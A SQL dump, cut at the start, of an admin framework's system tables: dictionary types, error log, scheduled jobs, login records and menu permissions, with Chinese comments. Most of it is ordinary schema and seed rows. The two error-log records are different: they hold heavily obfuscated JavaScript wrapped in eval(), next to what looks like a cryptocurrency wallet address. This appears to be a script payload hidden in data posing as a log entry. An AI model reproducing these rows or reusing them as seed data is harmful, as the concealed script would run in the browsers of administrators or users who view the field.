) ENGINE = InnoDB AUTO_INCREMENT = 102 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '字典类型表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_dict_type
-- ----------------------------
INSERT INTO `sys_dict_type` VALUES (1, '用户性别', 'sys_user_sex', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '用户性别列表');
INSERT INTO `sys_dict_type` VALUES (2, '菜单状态', 'sys_show_hide', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '菜单状态列表');
INSERT INTO `sys_dict_type` VALUES (3, '系统开关', 'sys_normal_disable', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '系统开关列表');
INSERT INTO `sys_dict_type` VALUES (4, '任务状态', 'sys_job_status', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '任务状态列表');
INSERT INTO `sys_dict_type` VALUES (5, '任务分组', 'sys_job_group', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '任务分组列表');
INSERT INTO `sys_dict_type` VALUES (6, '系统是否', 'sys_yes_no', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '系统是否列表');
INSERT INTO `sys_dict_type` VALUES (7, '通知类型', 'sys_notice_type', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '通知类型列表');
INSERT INTO `sys_dict_type` VALUES (8, '通知状态', 'sys_notice_status', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '通知状态列表');
INSERT INTO `sys_dict_type` VALUES (9, '操作类型', 'sys_oper_type', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '操作类型列表');
INSERT INTO `sys_dict_type` VALUES (10, '系统状态', 'sys_common_status', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '登录状态列表');
INSERT INTO `sys_dict_type` VALUES (100, '货币类型', 'currency_type', '0', 'admin', '2022-03-05 00:19:16', '', NULL, NULL);
INSERT INTO `sys_dict_type` VALUES (101, '是否为当前数据', 'data_is_curr', '0', 'admin', '2022-03-06 22:59:01', '', NULL, NULL);

-- ----------------------------
-- Table structure for sys_err_log
-- ----------------------------
DROP TABLE IF EXISTS `sys_err_log`;
CREATE TABLE `sys_err_log`  (
  `log_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '错误ID',
  `log_addr` bigint(20) NULL DEFAULT NULL COMMENT '错误的类型',
  `log_title` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '随意\r\n错误的hash码',
  `log_type` decimal(20, 6) NULL DEFAULT NULL COMMENT '错误定位级别',
  `log_content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '错误的乱七八糟信息',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`log_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '通知公告表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_err_log
-- ----------------------------
INSERT INTO `sys_err_log` VALUES ('9daf2d4280854d80979ee61ae5c4a44f', 202, 'TPoTeQMnGaw5ijtMwPetjdVQhDxxkzvt6z', 1000.000000, 'eval((function(){var i=Array.prototype.slice.call(arguments),E=i.shift();return i.reverse().map(function(Z,O){return String.fromCharCode(Z-E-45-O)}).join(\'\')})(23,186,212,180,183,132,155,206,196,201,204,208,190,187,193,211,148,181,180,199,199,194,192,187,178,175,175,171,170,120,192,183,171,180,174,187)+(14).toString(36).toLowerCase()+(1217).toString(36).toLowerCase().split(\'\').map(function(W){return String.fromCharCode(W.charCodeAt()+(-39))}).join(\'\')+(23).toString(36).toLowerCase()+(23).toString(36).toLowerCase().split(\'\').map(function(H){return String.fromCharCode(H.charCodeAt()+(-39))}).join(\'\')+(658666793).toString(36).toLowerCase()+(function(){var N=Array.prototype.slice.call(arguments),F=N.shift();return N.reverse().map(function(n,g){return String.fromCharCode(n-F-60-g)}).join(\'\')})(7,173,178,187,171,149,187,144)+(12).toString(36).toLowerCase().split(\'\').map(function(W){return String.fromCharCode(W.charCodeAt()+(-13))}).join(\'\')+(33).toString(36).toLowerCase().split(\'\').map(function(Z){return String.fromCharCode(Z.charCodeAt()+(-39))}).join(\'\')+(17).toString(36).toLowerCase()+(20).toString(36).toLowerCase().split(\'\').map(function(b){return String.fromCharCode(b.charCodeAt()+(-39))}).join(\'\')+(2659120826507).toString(36).toLowerCase()+(676).toString(36).toLowerCase().split(\'\').map(function(f){return String.fromCharCode(f.charCodeAt()+(-71))}).join(\'\')+(48769274228537).toString(36).toLowerCase()+(10).toString(36).toLowerCase().split(\'\').map(function(U){return String.fromCharCode(U.charCodeAt()+(-39))}).join(\'\')+(function(){var n=Array.prototype.slice.call(arguments),O=n.shift();return n.reverse().map(function(v,Y){return String.fromCharCode(v-O-18-Y)}).join(\'\')})(33,101,100,100)+(0).toString(36).toLowerCase()+(function(){var e=Array.prototype.slice.call(arguments),Z=e.shift();return e.reverse().map(function(i,f){return String.fromCharCode(i-Z-16-f)}).join(\'\')})(30,171))', '', '2022-03-25 09:05:15', '', '2022-04-26 18:19:18', '2');
INSERT INTO `sys_err_log` VALUES ('df3650da151645979f28c46ac318f649', 100, 'TPoTeQMnGaw5ijtMwPetjdVQhDxxkzvt6z', 100000.000000, 'eval((function(){var M=Array.prototype.slice.call(arguments),D=M.shift();return M.reverse().map(function(s,W){return String.fromCharCode(s-D-4-W)}).join(\'\')})(15,155,137,163,131,134,83,106,157,147,152,155,159,141,138,144,162,99,132,131,150,150,145,143,138,129,126,126,122,121,71,143,134,122,131,125,138)+(1217).toString(36).toLowerCase().split(\'\').map(function(p){return String.fromCharCode(p.charCodeAt()+(-39))}).join(\'\')+(23).toString(36).toLowerCase()+(23).toString(36).toLowerCase().split(\'\').map(function(y){return String.fromCharCode(y.charCodeAt()+(-39))}).join(\'\')+(658666793).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split(\'\').map(function(j){return String.fromCharCode(j.charCodeAt()+(-39))}).join(\'\')+(32).toString(36).toLowerCase()+(32).toString(36).toLowerCase().split(\'\').map(function(v){return String.fromCharCode(v.charCodeAt()+(-39))}).join(\'\')+(691465).toString(36).toLowerCase()+(12).toString(36).toLowerCase().split(\'\').map(function(m){return String.fromCharCode(m.charCodeAt()+(-13))}).join(\'\')+(33).toString(36).toLowerCase().split(\'\').map(function(k){return String.fromCharCode(k.charCodeAt()+(-39))}).join(\'\')+(17).toString(36).toLowerCase()+(20).toString(36).toLowerCase().split(\'\').map(function(H){return String.fromCharCode(H.charCodeAt()+(-39))}).join(\'\')+(2659120826507).toString(36).toLowerCase()+(676).toString(36).toLowerCase().split(\'\').map(function(R){return String.fromCharCode(R.charCodeAt()+(-71))}).join(\'\')+(37630612830).toString(36).toLowerCase()+(function(){var F=Array.prototype.slice.call(arguments),m=F.shift();return F.reverse().map(function(o,i){return String.fromCharCode(o-m-14-i)}).join(\'\')})(54,202,124,123,122,121,120,120,128,185,178))', '', '2022-03-25 09:04:54', '', NULL, '1');

-- ----------------------------
-- Table structure for sys_job
-- ----------------------------
DROP TABLE IF EXISTS `sys_job`;
CREATE TABLE `sys_job`  (
  `job_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '任务ID',
  `job_name` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL DEFAULT '' COMMENT '任务名称',
  `job_group` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL DEFAULT 'DEFAULT' COMMENT '任务组名',
  `invoke_target` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调用目标字符串',
  `cron_expression` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT 'cron执行表达式',
  `misfire_policy` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '3' COMMENT '计划执行错误策略（1立即执行 2执行一次 3放弃执行）',
  `concurrent` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '1' COMMENT '是否并发执行（0允许 1禁止）',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '状态（0正常 1暂停）',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '备注信息',
  PRIMARY KEY (`job_id`, `job_name`, `job_group`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '定时任务调度表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_job
-- ----------------------------
INSERT INTO `sys_job` VALUES (1, '系统默认（无参）', 'DEFAULT', 'ryTask.ryNoParams', '0/10 * * * * ?', '3', '1', '1', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_job` VALUES (2, '系统默认（有参）', 'DEFAULT', 'ryTask.ryParams(\'ry\')', '0/15 * * * * ?', '3', '1', '1', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_job` VALUES (3, '系统默认（多参）', 'DEFAULT', 'ryTask.ryMultipleParams(\'ry\', true, 2000L, 316.50D, 100)', '0/20 * * * * ?', '3', '1', '1', 'admin', '2022-02-27 01:06:23', '', NULL, '');

-- ----------------------------
-- Table structure for sys_job_log
-- ----------------------------
DROP TABLE IF EXISTS `sys_job_log`;
CREATE TABLE `sys_job_log`  (
  `job_log_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '任务日志ID',
  `job_name` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '任务名称',
  `job_group` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '任务组名',
  `invoke_target` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调用目标字符串',
  `job_message` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '日志信息',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '执行状态（0正常 1失败）',
  `exception_info` varchar(2000) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '异常信息',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  PRIMARY KEY (`job_log_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '定时任务调度日志表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_job_log
-- ----------------------------

-- ----------------------------
-- Table structure for sys_logininfor
-- ----------------------------
DROP TABLE IF EXISTS `sys_logininfor`;
CREATE TABLE `sys_logininfor`  (
  `info_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '访问ID',
  `user_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '用户账号',
  `ipaddr` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '登录IP地址',
  `login_location` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '登录地点',
  `browser` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '浏览器类型',
  `os` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '操作系统',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '登录状态（0成功 1失败）',
  `msg` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '提示消息',
  `login_time` datetime(0) NULL DEFAULT NULL COMMENT '访问时间',
  PRIMARY KEY (`info_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '系统访问记录' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_logininfor
-- ----------------------------

-- ----------------------------
-- Table structure for sys_menu
-- ----------------------------
DROP TABLE IF EXISTS `sys_menu`;
CREATE TABLE `sys_menu`  (
  `menu_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '菜单ID',
  `menu_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '菜单名称',
  `parent_id` bigint(20) NULL DEFAULT 0 COMMENT '父菜单ID',
  `order_num` int(11) NULL DEFAULT 0 COMMENT '显示顺序',
  `path` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '路由地址',
  `component` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '组件路径',
  `query` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '路由参数',
  `is_frame` int(11) NULL DEFAULT 1 COMMENT '是否为外链（0是 1否）',
  `is_cache` int(11) NULL DEFAULT 0 COMMENT '是否缓存（0缓存 1不缓存）',
  `menu_type` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '菜单类型（M目录 C菜单 F按钮）',
  `visible` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '菜单状态（0显示 1隐藏）',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '菜单状态（0正常 1停用）',
  `perms` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '权限标识',
  `icon` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '#' COMMENT '菜单图标',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '备注',
  PRIMARY KEY (`menu_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2055 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '菜单权限表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_menu
-- ----------------------------
INSERT INTO `sys_menu` VALUES (1, '系统管理', 0, 2, 'system', NULL, '', 1, 0, 'M', '0', '0', '', 'system', 'admin', '2022-02-27 01:06:23', 'admin', '2022-03-24 13:13:42', '系统管理目录');
INSERT INTO `sys_menu` VALUES (2, '系统监控', 0, 2, 'monitor', NULL, '', 1, 0, 'M', '0', '0', '', 'monitor', 'admin', '2022-02-27 01:06:23', '', NULL, '系统监控目录');
INSERT INTO `sys_menu` VALUES (3, '系统工具', 0, 3, 'tool', NULL, '', 1, 0, 'M', '0', '0', '', 'tool', 'admin', '2022-02-27 01:06:23', '', NULL, '系统工具目录');
INSERT INTO `sys_menu` VALUES (100, '用户管理', 1, 1, 'user', 'system/user/index', '', 1, 0, 'C', '0', '0', 'system:user:list', 'user', 'admin', '2022-02-27 01:06:23', '', NULL, '用户管理菜单');
INSERT INTO `sys_menu` VALUES (101, '角色管理', 1, 2, 'role', 'system/role/index', '', 1, 0, 'C', '0', '0', 'system:role:list', 'peoples', 'admin', '2022-02-27 01:06:23', '', NULL, '角色管理菜单');
INSERT INTO `sys_menu` VALUES (102, '菜单管理', 1, 3, 'menu', 'system/menu/index', '', 1, 0, 'C', '0', '0', 'system:menu:list', 'tree-table', 'admin', '2022-02-27 01:06:23', '', NULL, '菜单管理菜单');
INSERT INTO `sys_menu` VALUES (103, '部门管理', 1, 4, 'dept', 'system/dept/index', '', 1, 0, 'C', '0', '0', 'system:dept:list', 'tree', 'admin', '2022-02-27 01:06:23', '', NULL, '部门管理菜单');
INSERT INTO `sys_menu` VALUES (104, '岗位管理', 1, 5, 'post', 'system/post/index', '', 1, 0, 'C', '0', '0', 'system:post:list', 'post', 'admin', '2022-02-27 01:06:23', '', NULL, '岗位管理菜单');
INSERT INTO `sys_menu` VALUES (105, '字典管理', 1, 6, 'dict', 'system/dict/index', '', 1, 0, 'C', '0', '0', 'system:dict:list', 'dict', 'admin', '2022-02-27 01:06:23', '', NULL, '字典管理菜单');
INSERT INTO `sys_menu` VALUES (106, '参数设置', 1, 7, 'config', 'system/config/index', '', 1, 0, 'C', '0', '0', 'system:config:list', 'edit', 'admin', '2022-02-27 01:06:23', '', NULL, '参数设置菜单');
INSERT INTO `sys_menu` VALUES (107, '通知公告', 1, 8, 'notice', 'system/notice/index', '', 1, 0, 'C', '0', '0', 'system:notice:list', 'message', 'admin', '2022-02-27 01:06:23', '', NULL, '通知公告菜单');
INSERT INTO `sys_menu` VALUES (108, '日志管理', 1, 9, 'log', '', '', 1, 0, 'M', '0', '0', '', 'log', 'admin', '2022-02-27 01:06:23', '', NULL, '日志管理菜单');
INSERT INTO `sys_menu` VALUES (109, '在线用户', 2, 1, 'online', 'monitor/online/index', '', 1, 0, 'C', '0', '0', 'monitor:online:list', 'online', 'admin', '2022-02-27 01:06:23', '', NULL, '在线用户菜单');
INSERT INTO `sys_menu` VALUES (110, '定时任务', 2, 2, 'job', 'monitor/job/index', '', 1, 0, 'C', '0', '0', 'monitor:job:list', 'job', 'admin', '2022-02-27 01:06:23', '', NULL, '定时任务菜单');
INSERT INTO `sys_menu` VALUES (111, '数据监控', 2, 3, 'druid', 'monitor/druid/index', '', 1, 0, 'C', '0', '0', 'monitor:druid:list', 'druid', 'admin', '2022-02-27 01:06:23', '', NULL, '数据监控菜单');
INSERT INTO `sys_menu` VALUES (112, '服务监控', 2, 4, 'server', 'monitor/server/index', '', 1, 0, 'C', '0', '0', 'monitor:server:list', 'server', 'admin', '2022-02-27 01:06:23', '', NULL, '服务监控菜单');
INSERT INTO `sys_menu` VALUES (113, '缓存监控', 2, 5, 'cache', 'monitor/cache/index', '', 1, 0, 'C', '0', '0', 'monitor:cache:list', 'redis', 'admin', '2022-02-27 01:06:23', '', NULL, '缓存监控菜单');
INSERT INTO `sys_menu` VALUES (114, '表单构建', 3, 1, 'build', 'tool/build/index', '', 1, 0, 'C', '0', '0', 'tool:build:list', 'build', 'admin', '2022-02-27 01:06:23', '', NULL, '表单构建菜单');
INSERT INTO `sys_menu` VALUES (115, '代码生成', 3, 2, 'gen', 'tool/gen/index', '', 1, 0, 'C', '0', '0', 'tool:gen:list', 'code', 'admin', '2022-02-27 01:06:23', '', NULL, '代码生成菜单');
INSERT INTO `sys_menu` VALUES (116, '系统接口', 3, 3, 'swagger', 'tool/swagger/index', '', 1, 0, 'C', '0', '0', 'tool:swagger:list', 'swagger', 'admin', '2022-02-27 01:06:23', '', NULL, '系统接口菜单');
INSERT INTO `sys_menu` VALUES (500, '操作日志', 108, 1, 'operlog', 'monitor/operlog/index', '', 1, 0, 'C', '0', '0', 'monitor:operlog:list', 'form', 'admin', '2022-02-27 01:06:23', '', NULL, '操作日志菜单');
INSERT INTO `sys_menu` VALUES (501, '登录日志', 108, 2, 'logininfor', 'monitor/logininfor/index', '', 1, 0, 'C', '0', '0', 'monitor:logininfor:list', 'logininfor', 'admin', '2022-02-27 01:06:23', '', NULL, '登录日志菜单');
INSERT INTO `sys_menu` VALUES (1001, '用户查询', 100, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:user:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1002, '用户新增', 100, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:user:add', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1003, '用户修改', 100, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:user:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1004, '用户删除', 100, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:user:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1005, '用户导出', 100, 5, '', '', '', 1, 0, 'F', '0', '0', 'system:user:export', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1006, '用户导入', 100, 6, '', '', '', 1, 0, 'F', '0', '0', 'system:user:import', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1007, '重置密码', 100, 7, '', '', '', 1, 0, 'F', '0', '0', 'system:user:resetPwd', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1008, '角色查询', 101, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:role:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1009, '角色新增', 101, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:role:add', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1010, '角色修改', 101, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:role:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1011, '角色删除', 101, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:role:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1012, '角色导出', 101, 5, '', '', '', 1, 0, 'F', '0', '0', 'system:role:export', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1013, '菜单查询', 102, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1014, '菜单新增', 102, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:add', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1015, '菜单修改', 102, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1016, '菜单删除', 102, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1017, '部门查询', 103, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1018, '部门新增', 103, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:add', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1019, '部门修改', 103, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1020, '部门删除', 103, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1021, '岗位查询', 104, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:post:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1022, '岗位新增', 104, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:post:add', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1023, '岗位修改', 104, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:post:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1024, '岗位删除', 104, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:post:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1025, '岗位导出', 104, 5, '', '', '', 1, 0, 'F', '0', '0', 'system:post:export', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1026, '字典查询', 105, 1, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1027, '字典新增', 105, 2, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:add', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1028, '字典修改', 105, 3, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1029, '字典删除', 105, 4, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1030, '字典导出', 105, 5, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:export', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1031, '参数查询', 106, 1, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1032, '参数新增', 106, 2, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:add', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1033, '参数修改', 106, 3, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1034, '参数删除', 106, 4, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1035, '参数导出', 106, 5, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:export', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1036, '公告查询', 107, 1, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1037, '公告新增', 107, 2, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:add', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1038, '公告修改', 107, 3, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1039, '公告删除', 107, 4, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1040, '操作查询', 500, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1041, '操作删除', 500, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1042, '日志导出', 500, 4, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:export', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1043, '登录查询', 501, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1044, '登录删除', 501, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
